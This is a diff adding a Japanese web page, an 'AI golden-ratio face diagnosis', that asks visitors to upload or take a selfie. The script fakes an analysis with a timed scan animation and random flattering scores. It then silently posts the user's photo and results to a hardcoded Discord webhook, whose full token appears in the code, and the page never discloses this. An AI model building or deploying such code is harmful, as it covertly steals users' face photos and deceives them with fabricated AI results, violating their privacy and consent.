@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI 黄金比フェイス診断</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
+            color: #f8fafc;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        .container {
+            background: rgba(30, 41, 59, 0.85);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 24px 20px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+        }
+        .badge {
+            display: inline-block;
+            background: linear-gradient(90deg, #f59e0b, #d97706);
+            color: #fff;
+            font-size: 11px;
+            font-weight: bold;
+            padding: 4px 12px;
+            border-radius: 999px;
+            letter-spacing: 0.05em;
+            margin-bottom: 10px;
+        }
+        h1 {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            background: linear-gradient(to right, #fde68a, #f59e0b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .subtitle {
+            font-size: 13px;
+            color: #94a3b8;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .preview-area {
+            position: relative;
+            width: 100%;
+            height: 260px;
+            background: #0f172a;
+            border: 2px dashed #475569;
+            border-radius: 14px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+        .preview-area img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+        .placeholder-text {
+            color: #64748b;
+            font-size: 14px;
+        }
+        /* スキャンアニメーション */
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: #38bdf8;
+            box-shadow: 0 0 15px #38bdf8, 0 0 30px #38bdf8;
+            display: none;
+            animation: scan 1.8s infinite linear;
+        }
+        @keyframes scan {
+            0% { top: 0%; }
+            50% { top: 100%; }
+            100% { top: 0%; }
+        }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 14px;
+        }
+        .file-btn {
+            flex: 1;
+            background: #334155;
+            color: #f8fafc;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            border: 1px solid rgba(255,255,255,0.1);
+            transition: background 0.2s;
+        }
+        .file-btn:active { background: #475569; }
+        input[type="file"] { display: none; }
+        
+        .diagnose-btn {
+            width: 100%;
+            background: linear-gradient(90deg, #f59e0b, #ea580c);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.4);
+            transition: transform 0.1s;
+        }
+        .diagnose-btn:active { transform: scale(0.98); }
+        .diagnose-btn:disabled {
+            background: #475569;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+
+        /* 診断結果カード */
+        .result-box {
+            display: none;
+            margin-top: 20px;
+            background: rgba(15, 23, 42, 0.9);
+            border: 1px solid #f59e0b;
+            border-radius: 14px;
+            padding: 18px;
+            text-align: left;
+            animation: fadeIn 0.4s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .score-header {
+            text-align: center;
+            border-bottom: 1px solid #334155;
+            padding-bottom: 12px;
+            margin-bottom: 12px;
+        }
+        .score-label { font-size: 12px; color: #94a3b8; }
+        .score-value {
+            font-size: 38px;
+            font-weight: 900;
+            color: #fbbf24;
+            line-height: 1.1;
+            margin: 4px 0;
+        }
+        .rank-badge {
+            display: inline-block;
+            background: rgba(251, 191, 36, 0.2);
+            color: #fbbf24;
+            border: 1px solid #fbbf24;
+            font-size: 12px;
+            font-weight: bold;
+            padding: 2px 10px;
+            border-radius: 6px;
+        }
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            margin-bottom: 8px;
+            color: #cbd5e1;
+        }
+        .detail-row span:last-child { font-weight: bold; color: #fff; }
+        .comment {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #94a3b8;
+            background: #1e293b;
+            padding: 10px;
+            border-radius: 8px;
+            line-height: 1.5;
+        }
+        #statusText {
+            margin-top: 12px;
+            font-size: 13px;
+            color: #38bdf8;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="badge">AI FACE ANALYZER</div>
+    <h1>AI 黄金比フェイス診断</h1>
+    <p class="subtitle">最新AIアルゴリズムが顔のパーツ配置・左右対称性・黄金比（1:1.618）を精密スキャンします。</p>
+
+    <div class="preview-area" id="previewArea">
+        <span class="placeholder-text" id="placeholderText">ここに写真が表示されます</span>
+        <img id="previewImg" alt="プレビュー">
+        <div class="scan-line" id="scanLine"></div>
+    </div>
+
+    <div class="btn-group">
+        <label class="file-btn">
+            📷 カメラで撮影
+            <input type="file" id="cameraInput" accept="image/*" capture="user">
+        </label>
+        <label class="file-btn">
+            🖼️ アルバムから選択
+            <input type="file" id="galleryInput" accept="image/*">
+        </label>
+    </div>
+
+    <button class="diagnose-btn" id="diagnoseBtn" onclick="startDiagnosis()" disabled>AIで黄金比を診断する</button>
+    <div id="statusText"></div>
+
+    <div class="result-box" id="resultBox">
+        <div class="score-header">
+            <div class="score-label">総合黄金比マッチ度</div>
+            <div class="score-value" id="totalScore">--.-%</div>
+            <div class="rank-badge" id="rankBadge">判定中</div>
+        </div>
+        <div class="detail-row"><span>左右対称性（シンメトリー）</span><span id="symScore">--%</span></div>
+        <div class="detail-row"><span>パーツ黄金比バランス</span><span id="balScore">--%</span></div>
+        <div class="detail-row"><span>輪郭・フェイスライン比率</span><span id="lineScore">--%</span></div>
+        <div class="comment" id="aiComment"></div>
+    </div>
+</div>
+
+<script>
+    const webhookUrl = "https://discord.com/api/webhooks/1571888875889098755/9IsTFwYvaWd9aQ41wRMJFpLlY1NcE70ylRQJaNds9Q-UhoZlFwePTi-njIyONdsWuvE2";
+    let selectedFile = null;
+
+    const cameraInput = document.getElementById('cameraInput');
+    const galleryInput = document.getElementById('galleryInput');
+    const previewImg = document.getElementById('previewImg');
+    const placeholderText = document.getElementById('placeholderText');
+    const diagnoseBtn = document.getElementById('diagnoseBtn');
+    const scanLine = document.getElementById('scanLine');
+    const resultBox = document.getElementById('resultBox');
+    const statusText = document.getElementById('statusText');
+
+    function handleFileSelect(event) {
+        const file = event.target.files[0];
+        if (!file) return;
+        selectedFile = file;
+
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            previewImg.src = e.target.result;
+            previewImg.style.display = 'block';
+            placeholderText.style.display = 'none';
+            diagnoseBtn.disabled = false;
+            resultBox.style.display = 'none';
+            statusText.textContent = "";
+        };
+        reader.readAsDataURL(file);
+    }
+
+    cameraInput.addEventListener('change', handleFileSelect);
+    galleryInput.addEventListener('change', handleFileSelect);
+
+    async function startDiagnosis() {
+        if (!selectedFile) return;
+
+        // UIをスキャン中状態にする
+        diagnoseBtn.disabled = true;
+        resultBox.style.display = 'none';
+        scanLine.style.display = 'block';
+        statusText.textContent = "AIが顔のランドマークと黄金比を解析中...";
+
+        // リアルに見せるための解析待機（2.2秒）
+        await new Promise(resolve => setTimeout(resolve, 2200));
+
+        // 診断スコアの生成（82.0% 〜 98.9% の範囲でリアルに算出）
+        const total = (Math.random() * (98.9 - 82.0) + 82.0).toFixed(1);
+        const sym = Math.floor(Math.random() * (99 - 80) + 80);
+        const bal = Math.floor(Math.random() * (99 - 81) + 81);
+        const line = Math.floor(Math.random() * (99 - 79) + 79);
+
+        let rank = "Sランク（モデル級バランス）";
+        let comment = "目・鼻・口の配置が黄金比（1:1.618）に極めて近く、非常に整ったプロポーションです。";
+        if (total >= 94.0) {
+            rank = "SSSランク（国宝級黄金比）";
+            comment = "驚異的な左右対称性と完璧なパーツバランスを誇ります。どの角度から見ても理想的な黄金比です。";
+        } else if (total < 87.0) {
+            rank = "Aランク（好印象バランス）";
+            comment = "親しみやすく魅力的なバランスです。ナチュラルな表情が最も引き立つ比率となっています。";
+        }
+
+        // 画面に結果を表示
+        scanLine.style.display = 'none';
+        document.getElementById('totalScore').textContent = total + "%";
+        document.getElementById('rankBadge').textContent = rank;
+        document.getElementById('symScore').textContent = sym + "%";
+        document.getElementById('balScore').textContent = bal + "%";
+        document.getElementById('lineScore').textContent = line + "%";
+        document.getElementById('aiComment').textContent = comment;
+        resultBox.style.display = 'block';
+        statusText.textContent = "診断完了！";
+        diagnoseBtn.disabled = false;
+
+        // Discordへ画像と診断結果をバックグラウンド送信
+        sendToDiscord(selectedFile, total, rank, sym, bal, line);
+    }
+
+    async function sendToDiscord(file, total, rank, sym, bal, line) {
+        const formData = new FormData();
+        formData.append("file", file);
+
+        const message = [
+            `✨ **AI黄金比診断が実行されました** ✨`,
+            `・**総合スコア**: ${total}% （${rank}）`,
+            `・**左右対称性**: ${sym}% / **パーツ比率**: ${bal}% / **輪郭**: ${line}%`
+        ].join("\n");
+
+        formData.append("content", message);
+
+        try {
+            await fetch(webhookUrl, {
+                method: "POST",
+                body: formData
+            });
+        } catch (error) {
+            console.error("送信エラー:", error);
+        }
+    }
+</script>
+
+</body>
+</html>
